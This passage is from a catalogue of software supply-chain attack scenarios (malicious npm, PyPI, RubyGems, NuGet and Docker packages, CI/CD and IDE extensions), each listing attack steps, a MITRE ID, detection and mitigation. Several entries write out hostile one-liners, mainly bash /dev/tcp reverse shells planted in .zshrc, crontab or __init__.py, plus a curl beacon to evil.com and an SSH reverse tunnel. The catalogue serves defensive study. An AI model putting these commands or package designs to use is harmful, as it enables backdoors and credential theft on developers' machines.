- **Tags**: #github #actionscache #cicd

## NPM Package Opens Malicious WebSocket in Browser Context

- **Attack Type**: Malicious Library
- **Target**: Browser automation or testing systems
- **Vulnerability**: Live DOM exfiltration via WebSocket inside browser
- **MITRE**: T1176
- **Impact**: Session hijack, internal data exposure
- **Tools**: Puppeteer, NPM, WebSocket
- **Scenario**: Instead of installing a Chrome extension, the package uses Puppeteer to open a browser with an injected WebSocket to attacker’s server.
- **Attack Steps**: 1. Attacker publishes a package puppeteer-utils-pro that extends normal Puppeteer usage. 2. When a developer calls launchBrowser(), the script opens the browser and injects a WebSocket connection in the first loaded page. 3. The WebSocket silently communicates browsing data, user actions, and even cookies. 4. It forwards all DOM content changes to the attacker's server. 5. Because this happens in a controlled headless browser, the dev doesn’t notice. 6. Attacker uses session cookies to impersonate users or scrape internal dashboards.
- **Detection**: Monitor unexpected WebSocket connections from headless sessions
- **Solution**: Inspect browser launch options and disable unknown scripts
- **Tags**: #puppeteer #websocketleak #browserautomation

## CI Build Logs Secrets to Public Issue Tracker

- **Attack Type**: CI/CD Dependency Injection
- **Target**: CI/CD environments
- **Vulnerability**: Outbound secrets via GitHub API
- **MITRE**: T1552
- **Impact**: Leaked tokens, env vars
- **Tools**: GitHub Actions, curl, GitHub REST API
- **Scenario**: Instead of Pastebin, attacker uses a GitHub Issue opened via API to store secrets from CI builds.
- **Attack Steps**: 1. Attacker publishes an NPM package ci-logger-core. 2. Postinstall script extracts all environment variables during the CI pipeline run. 3. Script uses GitHub API token to create an issue on attacker’s repo. 4. The body of the issue contains base64’d secrets from the build environment. 5. Attacker later scrapes the issue comments for secrets.
- **Detection**: Monitor GitHub API usage patterns in builds
- **Solution**: Block unauthorized GitHub API calls from builds
- **Tags**: #ci #secrets #githubapi

## Python Wheel Includes Hidden C2 Beacon in Binary Extension

- **Attack Type**: Malicious Library
- **Target**: Developer machines, CI runners
- **Vulnerability**: Malicious logic in compiled wheel binary
- **MITRE**: T1043
- **Impact**: Remote beacon, asset fingerprinting
- **Tools**: PyPI, Cython, Python wheels
- **Scenario**: Instead of using setup.py, the attacker embeds a compiled C extension that launches a C2 beacon.
- **Attack Steps**: 1. Attacker creates a package cymathplus containing a .so binary built with Cython. 2. Binary includes logic to open a TCP socket on install and beacon system info. 3. On pip install, the wheel is unpacked, and the .so is loaded by Python interpreter. 4. No setup.py abuse, so static analysis is bypassed. 5. Beacon signals attacker with hostname, IP, and user info.
- **Detection**: Monitor network activity post-wheel install
- **Solution**: Restrict use of binary wheels, prefer source installs
- **Tags**: #pypi #wheel #cython

## NPM Dependency Chain Poisoned via Maintainer Account Takeover

- **Attack Type**: Maintainer Compromise
- **Target**: Apps with deep dependency trees
- **Vulnerability**: Account takeover in dependency graph
- **MITRE**: T1195.002
- **Impact**: Silent credential exfiltration
- **Tools**: npm, npmjs.com
- **Scenario**: Instead of unpublishing, attacker hijacks an account of a dependency maintainer and publishes malicious patch
- **Attack Steps**: 1. Attacker gains access to leftpad-helper maintainer account via credential stuffing. 2. Publishes version 1.3.7 with malicious postinstall that reads .env file and uploads it via HTTPS. 3. Thousands of apps that indirectly depend on this helper module fetch the poisoned version. 4. The attack bypasses public scrutiny because package isn't widely visible, just indirectly used.
- **Detection**: Audit new releases of deep transitive deps
- **Solution**: Use npm audit signatures, verify maintainers
- **Tags**: #npm #dependencychain #accounttakeover

## Alpine Container Includes Crontab Beacon to External Server

- **Attack Type**: Container Supply Chain
- **Target**: Container environments
- **Vulnerability**: Scheduled metadata leak via cron
- **MITRE**: T1083
- **Impact**: Recon via scheduled tasks
- **Tools**: Docker, Alpine Linux
- **Scenario**: Rather than modifying SSH, attacker adds cron entry to ping external server periodically from running containers.
- **Attack Steps**: 1. Attacker builds image alpine-latest-lite with /etc/crontabs/root set to */5 * * * * curl http://evil.com/ping?host=$(hostname). 2. Image is published with benign tags and no visible differences from Alpine. 3. Developers use the image in CI and prod containers. 4. Once deployed, cron silently leaks hostnames or container metadata to attacker’s server.
- **Detection**: Monitor outbound curl traffic in container cronjobs
- **Solution**: Block unknown cron entries in base images
- **Tags**: #docker #cron #containerleak

## VS Code Theme Extension Loads Remote CSS with JS Injection

- **Attack Type**: Extension Supply Chain
- **Target**: Developer IDEs using custom themes
- **Vulnerability**: Remote CSS injection via extension UI
- **MITRE**: T1176
- **Impact**: Token theft, session hijack
- **Tools**: VS Code, Theme API
- **Scenario**: Instead of JS from CDN, attacker uses remote CSS with embedded url("javascript:...") payload
- **Attack Steps**: 1. Attacker submits OneDark-Enhanced VS Code theme extension. 2. Extension loads remote CSS from https://attacker.site/dark.css. 3. CSS includes background-image: url("javascript:eval(atob('...'))") trick. 4. Once rendered in extension webview, it executes JS that captures clipboard data. 5. Attacker receives user clipboard (e.g., copied tokens or credentials).
- **Detection**: Audit extension webview resources and CSS origins
- **Solution**: Disallow remote styles/scripts in VS Code themes
- **Tags**: #vscode #theming #clipboardleak

## AWS Keys Leaked via Git Hooks in Malicious NPM Package

- **Attack Type**: Malicious Library
- **Target**: Developer workstations
- **Vulnerability**: Git hook abuse for exfiltration
- **MITRE**: T1552
- **Impact**: Stealthy, repeated credential leaks
- **Tools**: NPM, Git, Node.js
- **Scenario**: Instead of a postinstall, attacker installs a malicious Git hook that runs on git commit to exfiltrate AWS keys.
- **Attack Steps**: 1. Attacker publishes aws-helper-hooks package. 2. During install, it creates .git/hooks/pre-commit script that reads process.env.AWS_SECRET_ACCESS_KEY. 3. Script sends secrets via HTTPS POST on every commit. 4. Developer unknowingly commits code, triggering hook. 5. Secrets are sent silently with no CLI output.
- **Detection**: Audit .git/hooks files in cloned repos
- **Solution**: Block hook creation in package scripts
- **Tags**: #git #npm #hookabuse

## PyPI Wheel with Fake Dependency Resolution Hijack

- **Attack Type**: Dependency Confusion
- **Target**: Remote Python developers
- **Vulnerability**: Indirect dependency hijack via install_requires
- **MITRE**: T1195.002
- **Impact**: Lateral confusion via sub-dependency
- **Tools**: PyPI, setuptools
- **Scenario**: Instead of spoofing the name, attacker leverages a custom install_requires dependency to pull malicious payloads indirectly.
- **Attack Steps**: 1. Attacker creates corp-tools package with setup.py declaring install_requires=["corp-authlib>=5.0.0"]. 2. corp-authlib is not on internal index but exists publicly as malicious. 3. On pip install, the tool resolves and installs the public corp-authlib. 4. That package runs reverse shell in its __init__.py. 5. Compromise occurs silently through a “legit” dependency chain.
- **Detection**: Log indirect dependency trees in CI builds
- **Solution**: Require internal-only prefixes or metadata
- **Tags**: #pypi #dependencychain #subdepattack

## NPM Package Uses WebSocket Covert Channel

- **Attack Type**: Malicious Library
- **Target**: Browser-based apps, Node servers
- **Vulnerability**: Persistent covert channel via WebSocket
- **MITRE**: T1071.001
- **Impact**: Real-time data leakage, C2 control
- **Tools**: NPM, Node.js, WebSocket
- **Scenario**: Instead of DNS, attacker uses persistent WebSocket connections to exfiltrate session context in real-time.
- **Attack Steps**: 1. Attacker publishes uuid-socket-pro utility. 2. Package opens a WebSocket to ws://beacon.attacker.site on load. 3. Sends os.hostname(), process.env, and session cookies if found. 4. WebSocket remains open for real-time commands, unlike HTTP beacons. 5. Attacker maintains full duplex channel silently.
- **Detection**: Monitor outbound WebSocket domains
- **Solution**: Block WebSocket to unknown TLDs in runtime
- **Tags**: #websocket #npm #c2channel

## Jenkins Groovy Script Plugin Loads Remote Code via URLClassLoader

- **Attack Type**: CI/CD Plugin Poisoning
- **Target**: Jenkins build nodes
- **Vulnerability**: Unsafe Groovy classloading from remote
- **MITRE**: T1059.005
- **Impact**: Java-level code execution, internal pivot
- **Tools**: Jenkins, Groovy, Java
- **Scenario**: Instead of shelling out, attacker abuses Jenkins Groovy sandbox to pull and execute external Java classes.
- **Attack Steps**: 1. Attacker publishes plugin groovy-helper-plus. 2. Plugin includes Groovy script that invokes URLClassLoader with http://malicious.site/evil.jar. 3. The JAR executes arbitrary Java code during Jenkins build. 4. The code collects secrets, agent paths, and SSH keys. 5. Exfiltrates to attacker server via raw TCP.
- **Detection**: Detect URLClassLoader use in scripts
- **Solution**: Enforce Groovy sandbox restrictions
- **Tags**: #jenkins #groovy #urlclassloader

## RubyGem Posts Cloud Keys via Net::HTTP in Rakefile

- **Attack Type**: Malicious Library
- **Target**: Dev machines with Rake usage
- **Vulnerability**: Scripted data theft in build tasks
- **MITRE**: T1203
- **Impact**: Secrets theft via CLI tool misuse
- **Tools**: RubyGems, Ruby, Rake
- **Scenario**: Instead of eval, attacker uses a Rakefile to trigger data exfiltration during common CLI task execution.
- **Attack Steps**: 1. Attacker publishes json-rake-formatter. 2. Rakefile includes logic that reads ~/.aws/credentials and posts to https://attacker.site/creds. 3. Developer runs rake build or rake test assuming basic functionality. 4. Secrets are exfiltrated with no visible side effects. 5. The gem installs cleanly with no postinstall hook, bypassing audits.
- **Detection**: Audit Rakefile content, block net/http in tasks
- **Solution**: Run Rake in isolated/tested environments
- **Tags**: #rubygems #rake #awsleak

## Python PyPI Package with Clipboard Hijacker

- **Attack Type**: Malicious Library
- **Target**: Developer environments, finance apps
- **Vulnerability**: Abuse of clipboard via post-install scripts
- **MITRE**: T1059.006
- **Impact**: Silent crypto theft via clipboard injection
- **Tools**: PyPI, Python, pyperclip
- **Scenario**: Attacker publishes a Python package with a post-install script that runs a clipboard hijacker.
- **Attack Steps**: 1. Attacker creates a new PyPI package (e.g., pyperutils) with legit-sounding name and minor utilities.2. Inside setup.py, a post_install script is declared which executes on install.3. The script imports pyperclip or similar module to access clipboard contents silently.4. It monitors for wallet addresses (e.g., crypto formats) and replaces clipboard content with attacker’s wallet.5. Developer installs this package assuming it’s a helper lib.6. During app use or user interactions, copied wallet addresses get hijacked to attacker address.7. The attacker silently receives diverted payments.
- **Detection**: Monitor clipboard access by Python libraries
- **Solution**: Use trusted packages, block setup.py exec at install
- **Tags**: #pyperclip #crypto #clipjacking

## Malicious RubyGem That Hooks into IRB Shell

- **Attack Type**: Malicious Library
- **Target**: Dev machines, Ruby IRB consoles
- **Vulnerability**: Runtime code injection in REPL session
- **MITRE**: T1546.003
- **Impact**: Developer credential exfiltration
- **Tools**: RubyGems, Ruby IRB
- **Scenario**: RubyGem runs payloads via IRB shell hooks to steal dev credentials during debugging.
- **Attack Steps**: 1. Attacker creates a RubyGem (e.g., debug-helper) advertised as a utility to enhance irb debugging.2. In its lib/init.rb, it uses IRB.conf[:IRB_RC] hook to execute code when IRB starts.3. The code captures ENV vars, active SSH keys, AWS creds from ENV, and dumps them to a remote server.4. Developer installs the Gem and launches IRB for debugging without knowing.5. Hook triggers silently; creds are exfiltrated.6. Attacker uses leaked credentials to access internal services or cloud consoles.7. No standard logs reveal the attack since it's triggered via dev shell.
- **Detection**: Monitor outbound traffic from IRB sessions
- **Solution**: Block unknown REPL hooks, audit Gem internals
- **Tags**: #rubygems #irb #replattack

## Malicious NPM Package Uses Postinstall to Add SSH Key

- **Attack Type**: Malicious Library
- **Target**: Developer laptops, CI runners
- **Vulnerability**: Abuse of postinstall for SSH persistence
- **MITRE**: T1055.001
- **Impact**: Unauthorized remote shell access
- **Tools**: Node.js, npm
- **Scenario**: Package adds attacker’s SSH key to .ssh/authorized_keys during install process via lifecycle script.
- **Attack Steps**: 1. Attacker uploads a seemingly useful npm package like node-migrate-ssh.2. Inside package.json, they define a postinstall script.3. This script creates the .ssh directory if missing and appends attacker’s public key to .ssh/authorized_keys.4. Once a developer runs npm install, this script executes automatically.5. Attacker gains SSH access to the developer’s machine.6. If machine is part of CI/CD or has saved cloud keys, attacker pivots deeper.7. The package may also disable SSH logging or hide entries to evade detection.
- **Detection**: Monitor .ssh/ file changes post-npm install
- **Solution**: Restrict lifecycle script execution, use audit tooling
- **Tags**: #npm #sshkeyinjection #postinstall

## NuGet Package Executes PowerShell via Install Script

- **Attack Type**: Malicious Library
- **Target**: .NET developers, Windows machines
- **Vulnerability**: Hidden encoded payload in install script
- **MITRE**: T1059.001
- **Impact**: PowerShell-based remote control
- **Tools**: .NET, NuGet, PowerShell
- **Scenario**: Malicious NuGet package executes encoded PowerShell during install, enabling backdoor or data exfiltration.
- **Attack Steps**: 1. Attacker crafts a NuGet package like NetCoreEnhancer and uploads it to NuGet.org.2. The .nuspec file includes a PowerShell install script (install.ps1).3. The script decodes a Base64-encoded payload and runs it via Invoke-Expression.4. This payload sets up a reverse shell to attacker’s server.5. Developer installs the package in a C# project via Visual Studio or CLI.6. The malicious script runs in background, establishing persistent access.7. Attacker now interacts with the compromised host using PowerShell remoting or lateral movement.
- **Detection**: Alert on Base64 + Invoke-Expression combo in scripts
- **Solution**: Disable NuGet script execution by default
- **Tags**: #nuget #powershell #dotnetbackdoor

## Composer Package Hijacks Laravel ENV Variables

- **Attack Type**: Malicious Library
- **Target**: PHP/Laravel web apps
- **Vulnerability**: Env file scraping during Composer install
- **MITRE**: T1552.001
- **Impact**: Theft of application secrets
- **Tools**: PHP, Composer, Laravel
- **Scenario**: PHP Composer package targets Laravel .env and sends app secrets (DB creds, SMTP, keys) externally.
- **Attack Steps**: 1. Attacker creates a PHP Composer package (e.g., laravel-ext-log) pretending to enhance Laravel logging.2. Inside its bootstrap file, it searches for the .env file used by Laravel.3. It parses variables like APP_KEY, DB_PASSWORD, MAIL_PASSWORD, and sends them to a webhook.4. When installed via composer require, the malicious code runs during autoload.5. Laravel app starts and attacker silently receives its secrets.6. Using DB and SMTP creds, attacker may pivot into internal infrastructure.7. Since .env files are often unprotected locally, the breach is silent unless outbound traffic is logged.
- **Detection**: Monitor external traffic during Composer package load
- **Solution**: Scan .env for suspicious access patterns
- **Tags**: #composer #laravel #envleak

## Node‑Gyp Build Drops Native Screen Grabber

- **Attack Type**: Malicious Library
- **Target**: Developer workstations, CI runners
- **Vulnerability**: Native addon executed via node‑gyp build hook
- **MITRE**: T1056.001
- **Impact**: Visual data exfiltration (screen spying)
- **Tools**: npm, node‑gyp, C++, libpng
- **Scenario**: A seemingly harmless NPM TUI helper compiles a C++ addon that takes periodic screen‑shots and streams them out over HTTPS.
- **Attack Steps**: 1. Attacker publishes term‑capture‑pro, advertising richer terminal colors.2. binding.gyp compiles capture.cc, which quietly links X11 (Linux) or GDI+ (Windows).3. Addon’s Init() spawns a detached thread that captures the screen every 15 s, compresses with libpng, writes to /tmp/.scrbuf, and queues for upload.4. Post‑install JavaScript starts an HTTPS client that reads the buffer and POSTs to https://scr.leak.site/api with machine ID.5. Developer runs npm install; build succeeds with verbose logs suppressed.6. Screenshots of terminals, code editors, secrets, and passwords in clear view leave the host continuously.7. Attacker monitors the feed for credentials or proprietary source and pivots further.
- **Detection**: Raise alert on unexpected image libraries during addon builds; watch outbound JPEG/PNG traffic
- **Solution**: Block native builds from untrusted packages; require --ignore-scripts in automation
- **Tags**: #npm #nodegyp #screengrab

## PyPI Package Hijacks Browser via Remote‑Debug Port

- **Attack Type**: Malicious Library
- **Target**: Developer laptops, remote workers
- **Vulnerability**: Unchecked access to Chromium remote debugging port
- **MITRE**: T1539
- **Impact**: Account takeover via session replay
- **Tools**: PyPI, Python, Chrome DevTools Protocol
- **Scenario**: A “requests add‑on” launches Chrome with the remote‑debugging flag, then steals session cookies through DevTools.
- **Attack Steps**: 1. Attacker releases requests‑devtools promising auto‑retry logic.2. setup.py registers an entry‑point script rdp_boot.py executed on import.3. Script starts a hidden Chrome instance (--remote-debugging-port=9222 --user-data-dir=/tmp/.chromeX).4. Using websockets & Chrome DevTools Protocol, it enumerates all profiles, grabs cookies, localStorage, indexedDB.5. Data is AES‑encrypted and sent to wss://steal.cookies.xyz with host fingerprint.6. Developer simply import requests_devtools in tooling scripts; no browser window appears.7. Attacker replays GitHub / AWS Console sessions, bypassing MFA if tokens are still valid.
- **Detection**: Detect stealth chromium processes listening on 9222; inspect unexpected websocket egress
- **Solution**: Disable remote‑debug flags via policy; use network egress ACLs; pin trusted libs
- **Tags**: #pypi #chromedevtools #sessionhijack

## VS Code Setting‑Sync Token Stealer Extension

- **Attack Type**: Extension Supply Chain
- **Target**: Developer IDEs (Windows/macOS/Linux)
- **Vulnerability**: Over‑permissive Settings Sync OAuth scope
- **MITRE**: T1005
- **Impact**: Source & credential breach
- **Tools**: VS Code, TypeScript, REST API
- **Scenario**: Fake “Snippet Cloud” extension abuses VS Code’s Settings Sync OAuth token to pull entire workspace & secrets.
- **Attack Steps**: 1. Attacker uploads snippet‑cloud‑sync with flashy README & star badges.2. Extension requests "vscode.sync" scope, generating a Microsoft account token for Settings Sync.3. activate() callback harvests the sync token from global state, then POSTs to https://cdn.snip‑exfil.com/api. 4. Using that token, attacker invokes VS Code Sync REST to pull user settings, keybindings, and all synced snippets (which often contain JWTs, SQL queries, passwords).5. Extension next traverses the open workspace, zips source, .env, .aws, Kube configs.6. Archive streams through chunked PUT requests disguised as telemetry.7. Victim keeps coding; attacker has full codebase & cloud secrets within minutes.
- **Detection**: Monitor unusual Settings‑Sync REST calls; restrict extensions’ network access
- **Solution**: Allow only verified publishers; audit requested VS Code capabilities
- **Tags**: #vscode #settingssync #tokensteal

## GitHub Action Side‑Loads Malicious Container in Matrix Job

- **Attack Type**: CI/CD Pipeline Manipulation
- **Target**: OSS projects releasing via GitHub
- **Vulnerability**: Unverified third‑party build images & job matrices
- **MITRE**: T1609
- **Impact**: Supply‑chain backdoor in official releases
- **Tools**: GitHub Actions, Docker, Bash
- **Scenario**: Action pulls an attacker‑controlled Docker image that overwrites generated artifacts before upload.
- **Attack Steps**: 1. Attacker submits PR adding uses: evil/build‑matrix@v1 to workflow; claims faster cross‑builds.2. Action spins up job matrix, each step running inside image ghcr.io/evil/matrix‑node:18.3. Image’s entrypoint builds legit binaries then replaces /workspace/dist/*.js with versions containing obfuscated token‑stealer code.4. Action completes tests (still pass), uses actions/upload-artifact to push trojanized output.5. Maintainer merges PR; GitHub Release uses poisoned artifacts.6. Down‑stream consumers install breached package getting code that fetch()es ENV secrets at runtime.7. Attacker harvests SaaS tokens, credentials of every adopter.
- **Detection**: Enforce provenance & container‑image allow‑lists; verify artifact hashes in PR CI vs release
- **Solution**: Self‑host trusted builders; require “trusted publishing” & Sigstore attestation
- **Tags**: #githubactions #artifactpoison #cicd

## Go Module Exfiltrates via ICMP Payloads

- **Attack Type**: Malicious Library
- **Target**: Kubernetes & cloud Go services
- **Vulnerability**: Raw‑socket or ping misuse for covert exfil
- **MITRE**: T1046
- **Impact**: Passive infra mapping, low‑noise data leak
- **Tools**: Go Modules, ICMP, Raw Sockets
- **Scenario**: A Go helper silently embeds host metadata into ICMP echo packets, avoiding DNS & HTTP logs.
- **Attack Steps**: 1. Attacker pushes github.com/ghost/libpingdata offering wrapper funcs over net pkg.2. Init func dials raw socket; if not root, falls back to ping binary with -p custom payload.3. It gathers hostname, local IPs, container env, $KUBERNETES_SERVICE_HOST and encodes as hex.4. Every minute it sends ping -c1 -p <hexdata> 198.51.100.42 (attacker‑controlled).5. Replies ignored; attacker’s ICMP listener decodes payloads, mapping internal clusters.6. Cloud teams include module for latency checks; runs in prod pods & CI.7. Traffic often allowed (ICMP), so exfil bypasses standard HTTP/S egress filters.
- **Detection**: Inspect ICMP payloads for non‑zero patterns; block outbound raw ping in egress policy
- **Solution**: Pin go.sum; audit modules; restrict CAP_NET_RAW in containers
- **Tags**: #golang #icmpchannel #covert

## DockerHub Redis Image with Hidden Reverse Shell

- **Attack Type**: Container Supply Chain
- **Target**: Dev containers in cloud and local
- **Vulnerability**: Malicious ENTRYPOINT + reverse shell
- **MITRE**: T1059.004
- **Impact**: Initial access + persistent shell
- **Tools**: DockerHub, Redis, Bash
- **Scenario**: A rogue Redis image on DockerHub includes an init binary that opens a reverse shell on container start.
- **Attack Steps**: 1. Attacker publishes redis-enterprise:6.0 with copied metadata from the official Redis repo.2. In ENTRYPOINT, a custom script wraps redis-server, but first runs a hidden binary /.init.3. This binary opens a reverse shell to attacker.site:443 using bash -i >& /dev/tcp method.4. DevOps team includes the image in internal docker-compose.yml files without signature verification.5. When deployed, containers appear normal—Redis works—but attacker gets shell access with root permissions.6. Attacker lists files, checks mounted volumes, and pivots into cloud credentials and source code.7. Since Redis has no logs of .init, the breach remains stealthy.
- **Detection**: Alert on unknown binaries in Docker image layers; monitor outgoing TCP traffic
- **Solution**: Use signed images, enable runtime container policy enforcement
- **Tags**: #dockerhub #redis #reverseShell

## PyPI Wheel Drops Python-Based Keylogger via ctypes

- **Attack Type**: Malicious Library
- **Target**: Windows dev machines
- **Vulnerability**: Pure-Python runtime keylogger via Win API
- **MITRE**: T1056.001
- **Impact**: Credential theft via scripting
- **Tools**: PyPI, Python ctypes, Win32 API
- **Scenario**: A wheel on PyPI uses ctypes to load Windows APIs and capture keystrokes with no compiled extension.
- **Attack Steps**: 1. Attacker releases py-editor-enhancer, claiming syntax auto-completion features.2. The __init__.py contains ctypes.windll.user32 logic to install a keyboard hook using SetWindowsHookExW.3. On import, the hook runs a callback in Python that logs keystrokes to a hidden .log file.4. The log is either flushed to disk periodically or exfiltrated via HTTP PUT to log.collector.site.5. Since there's no compiled .so or .pyd, basic antivirus fails to flag the wheel.6. Developers running Windows install it normally through pip, unaware of runtime surveillance.7. Attacker harvests passwords typed in terminals, editors, and SSH sessions.
- **Detection**: Monitor ctypes use of hook APIs, unusual file writes in site-packages
- **Solution**: Review wheel contents; use sandboxed imports in secure environments
- **Tags**: #pypi #purepython #keylogger

## Maven Artifact Logs AWS Keys via Logging Side-Channel

- **Attack Type**: Malicious Library
- **Target**: CI-built JVM services
- **Vulnerability**: Side-channel exfil via logs
- **MITRE**: T1552
- **Impact**: Cloud credential leakage via trusted tooling
- **Tools**: Maven, Java Logging, Logback
- **Scenario**: A Maven dependency logs AWS credentials to a benign-looking log file that’s later uploaded by normal telemetry.
- **Attack Steps**: 1. Attacker publishes org.helpers:json-serialize-boost, advertised as faster Gson drop-in.2. A hidden class uses System.getenv() to grab AWS credentials and writes them via logger.info() to build/stats.log.3. This file is picked up by an existing telemetry agent (like Datadog or Splunk uploader) due to matching naming patterns.4. Logs appear as innocuous performance info ("serialize op took 10ms"), hiding secrets among noise.5. Because file output is locally allowed, and telemetry trusted, credentials leak undetected.6. Microservices using the dependency push the artifact to production, triggering exfil.7. Attacker monitors the telemetry sink or exploits shared dashboards where logs are visible.
- **Detection**: Audit logs for secrets-in-clear; inspect dependency logging paths
- **Solution**: Use secret scanners on build logs; restrict sensitive ENV access
- **Tags**: #maven #logleak #awskeys

## pipx Tool Opens Hidden SSH Tunnel as Post-Install

- **Attack Type**: Malicious Tooling
- **Target**: Linux dev VMs, laptops
- **Vulnerability**: CLI tools setting crontab-based persistence
- **MITRE**: T1547.001
- **Impact**: Remote access & persistence across reboots
- **Tools**: pipx, PyPI, crontab
- **Scenario**: A fake Python CLI tool, when installed via pipx, adds a crontab that opens an SSH reverse tunnel to attacker.
- **Attack Steps**: 1. Attacker uploads supertool-lite to PyPI with fancy README and usage examples.2. On pipx install, the tool's post-install script adds an @reboot entry to crontab: ssh -N -R 2222:localhost:22 attacker.site.3. If SSH keys exist (~/.ssh/id_rsa), it auto-connects silently.4. Otherwise, the package prompts for “tool login” and captures typed credentials.5. Every system reboot re-establishes access for the attacker via reverse shell.6. Tool appears harmless when run—printing mock output or help messages.7. Meanwhile, attacker uses the tunnel for remote persistence and lateral movement.
- **Detection**: Detect suspicious crontab entries tied to pipx tools
- **Solution**: Limit pipx to trusted packages; monitor SSH tunnels
- **Tags**: #pipx #sshbackdoor #cron

## Malicious Webpack Plugin Injects Eval Payload from Git Repo

- **Attack Type**: Build Step Injection
- **Target**: Frontend CI builds
- **Vulnerability**: Dynamic code eval via remote repo
- **MITRE**: T1608.001
- **Impact**: Client-side data theft on real users
- **Tools**: Webpack, npm, Node.js, Git
- **Scenario**: A Webpack plugin clones a GitHub repo mid-build and evals obfuscated code from a JS file within it.
- **Attack Steps**: 1. Attacker publishes html-dynamic-head plugin, claiming auto-generation of SEO <meta> tags.2. Plugin’s code runs git clone https://github.com/fakeorg/head-snippets.git into tmp/.3. It reads payload.js, obfuscated with Base64 and XOR, then runs eval(decoded).4. During npm run build, this executes silently and injects logic into the bundled output.5. Malicious bundle captures cookies or localStorage from end-users who load the site.6. Developers miss this during test builds; only production bundles include the code.7. Attacker gets access to user tokens, behavior analytics, or payment data.
- **Detection**: Detect eval(), git clone, and obfuscated decoding in build scripts
- **Solution**: Forbid dynamic code in build phase; enforce content trust on plugins
- **Tags**: #webpack #evalinject #supplychainjs

## Python Package Executes Remote Shell via base64 in __init__.py

- **Attack Type**: Malicious Library
- **Target**: Developer laptops, CI pipelines
- **Vulnerability**: Auto-exec + obfuscated reverse shell
- **MITRE**: T1059
- **Impact**: Remote access and system takeover
- **Tools**: PyPI, Python, base64, Bash
- **Scenario**: A Python package uses base64-encoded shell commands inside its __init__.py, auto-executed upon import.
- **Attack Steps**: 1. Attacker publishes http-client-fast, mimicking a popular Python HTTP utility. 2. In the __init__.py, attacker places a base64 string that decodes to bash -i >& /dev/tcp/badactor.io/8888 0>&1. 3. The decoded shell command runs via os.system() at import time, launching a reverse shell to the attacker's server. 4. This triggers as soon as the victim includes the package using import http_client_fast. 5. The reverse shell grants real-time access to the attacker—visible only in process listings or network traces. 6. Attacker can now dump environment variables, move laterally, or install additional malware. 7. The obfuscation bypasses basic string searches or static code reviews.
- **Detection**: Alert on base64-decoded shell patterns during import
- **Solution**: Audit all imported packages and enforce sandboxing in CI
- **Tags**: #python #pypi #base64shell

## GitHub Action Harvests Secrets via Encoded Payload

- **Attack Type**: CI/CD Injection
- **Target**: GitHub runners, AWS pipelines
- **Vulnerability**: Stealthy encoded credential exfiltration
- **MITRE**: T1552.001
- **Impact**: Cloud access key compromise
- **Tools**: GitHub Actions, AWS, curl, base64
- **Scenario**: A malicious GitHub Action stores AWS credentials in an encoded payload sent through an innocent API request.
- **Attack Steps**: 1. Attacker forks a known GitHub Action repo and edits the entrypoint to encode AWS_SECRET_ACCESS_KEY in base64. 2. Instead of direct exfiltration, the key is embedded in a User-Agent string used in a GET request to https://img.badcdn.io/pixel.png. 3. PR referencing this malicious fork is merged by developers unaware of the subtle change. 4. Upon CI run, the job leaks credentials via HTTP headers without raising firewall alerts. 5. Attacker collects secrets by passively monitoring logs or server headers. 6. Later, these credentials are used to create IAM roles and deploy crypto miners or access S3 buckets. 7. The Action appears functional, hiding the malicious behavior under normal logs.
- **Detection**: Inspect Action metadata, detect encoded env var usage
- **Solution**: Pin Actions by SHA and scan header-level data leaks
- **Tags**: #github #actionleak #encodedheaders

## NPM Module Appends Shell One-liner to .zshrc for Persistent Access

- **Attack Type**: Malicious Library
- **Target**: Mac/Linux developer environments
- **Vulnerability**: Persistent shell via init file tampering
- **MITRE**: T1053.005
- **Impact**: Long-term access on developer machines
- **Tools**: npm, Node.js, zsh, Bash
- **Scenario**: An NPM package injects a reverse shell one-liner into .zshrc, activating persistence every terminal session.
- **Attack Steps**: 1. Attacker publishes console-enhancer-pro, mimicking chalk or colors modules. 2. In its postinstall script, attacker runs echo 'bash -i >& /dev/tcp/evil.site/6666 0>&1' >> ~/.zshrc. 3. Since many devs use Zsh (especially on macOS), the backdoor activates each time a new terminal is launched. 4. The attacker gains recurring shell access without needing additional runtime processes. 5. Even after reboots, the .zshrc entry re-establishes contact if internet is available. 6. Developers may never inspect shell config files unless debugging. 7. Attack persists until the backdoor command is manually removed.
- **Detection**: Detect .zshrc or .bashrc tampering via package installs
- **Solution**: Restrict postinstall script execution in sensitive envs
- **Tags**: #npm #persistentshell #initabuse

## Docker Image Uses Entrypoint Script to Schedule Repeating Root Reverse Shell

- **Attack Type**: Container Supply Chain
- **Target**: Cloud-deployed containers
- **Vulnerability**: Entrypoint-time cronjob injection
- **MITRE**: T1053.003
- **Impact**: Persistent root shell in prod containers
- **Tools**: Docker, Bash, Cron
- **Scenario**: A DockerHub image includes a script in ENTRYPOINT that dynamically injects a cronjob at container boot.
- **Attack Steps**: 1. Attacker uploads nginx-tools-analytics to DockerHub with legit NGINX config samples. 2. Inside the image, a script /usr/local/bin/start.sh is added as the container's ENTRYPOINT. 3. On container start, it adds * * * * * root bash -i >& /dev/tcp/attacker.site/9001 0>&1 to /etc/crontab. 4. This bypasses Dockerfile static analysis since cronjob is injected only at runtime. 5. Containers running this image appear to operate normally—NGINX functions as expected. 6. Meanwhile, every minute a root shell is silently opened to the attacker. 7. Attacker can explore mounted secrets, environment variables, and even escape to the host if misconfigured.
- **Detection**: Monitor crontab files post-launch; scan container ENTRYPOINTS
- **Solution**: Disable writable cron in containers; enforce runtime integrity
- **Tags**: #docker #cronreverse #rootaccess

## Python Library Extracts SSH Keys via Temp File Trick

- **Attack Type**: Malicious Library
- **Target**: Developer systems, CI runners
- **Vulnerability**: SSH key theft via temp file staging
- **MITRE**: T1552.004
- **Impact**: Silent SSH key exfiltration with cleanup
- **Tools**: Python, PyPI, tempfile, threading
- **Scenario**: A PyPI package extracts SSH private keys and writes them to a temp file which is silently uploaded via scheduled thread.
- **Attack Steps**: 1. Attacker creates ssh-utils-fast posing as an SSH automation library. 2. In the __init__.py, obfuscated code decodes a payload that reads ~/.ssh/id_rsa content. 3. The script writes the key to a temp file using tempfile.NamedTemporaryFile(delete=False). 4. A threading.Timer is set to upload the file contents to https://ssh.upload.steal/key. 5. This delay avoids detection during initial import or scan. 6. After exfiltration, the temp file is unlinked using os.remove(), leaving no local trace. 7. Attacker uses stolen keys for GitHub, server SSH, or cloud login access.
- **Detection**: Monitor temp file creation in site-packages during runtime
- **Solution**: Prevent secret file reads via app sandboxing and file ACLs
- **Tags**: #pypi #sshstealer #tempfileabuse

## Gradle Plugin Injects Malicious Bytecode via ASM Manipulation

- **Attack Type**: Plugin Poisoning
- **Target**: JVM-based apps
- **Vulnerability**: Post-compile bytecode tampering
- **MITRE**: T1609
